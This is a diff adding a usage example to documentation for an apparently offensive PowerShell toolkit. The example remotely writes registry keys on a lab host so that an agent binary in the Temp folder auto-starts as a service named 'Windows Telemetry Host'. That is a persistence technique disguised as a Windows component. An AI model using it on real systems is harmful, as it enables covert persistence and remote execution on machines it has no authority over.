@@ -588,6 +588,24 @@ foreach ($value in $values) {
 }
 ```
 
+To stage a new service by registry writes so it is picked up after reboot, use `TboRegServiceCreateScenarios`.
+This updates `HKLM\SYSTEM\CurrentControlSet\Services\<Name>` directly; SCM applies it when the host boots.
+
+```powershell
+$serviceName = 'TBORegSvc'
+$servicePath = "HKLM\SYSTEM\CurrentControlSet\Services\$serviceName"
+New-TBORegKey -ServerName corp1-web01.corp1.lab.home-labs.lol -Path $servicePath
+
+$values = [Titanis.Tbo.Smb2.PowerShell.TboRegServiceCreateScenarios]::AutoStartOwnProcess(
+  '%SystemRoot%\Temp\tbo-agent.exe',
+  'Windows Telemetry Host',
+  'Telemetry host service.')
+
+foreach ($value in $values) {
+  Set-TBORegValue -ServerName corp1-web01.corp1.lab.home-labs.lol -Path $servicePath -Name $value.Name -Type $value.ValueType -Value $value.Value
+}
+```
+
 #### Get-TBOScheduledTasks
 
 Enumerates scheduled task definitions from the Tasks folder and maps them to TaskCache registry entries for task IDs and registry timestamps.
